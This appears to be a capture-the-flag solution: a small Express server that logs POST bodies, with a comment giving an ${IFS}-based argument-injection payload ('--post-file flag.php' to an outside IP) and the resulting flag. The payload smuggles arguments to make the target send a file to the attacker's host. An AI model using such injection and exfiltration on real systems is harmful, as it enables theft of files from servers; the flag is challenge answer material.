
const express = require('express');
const bodyParser = require('body-parser');
const PORT = 80;
const app = express();

app.use(bodyParser.urlencoded({
  extended: true
}));

app.post('/', function(req, res){
	console.log("X-MAS!!!!");
	console.log(req.body);
	res.send();
});

app.listen(PORT, function(){
	console.log('--------------------------------');
	console.log('Listening on port ' + PORT + '...');
	console.log('--------------------------------');
});

// Payload : ${IFS}-${IFS}--post-file${IFS}flag.php${IFS}141.164.55.161
// Output : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}
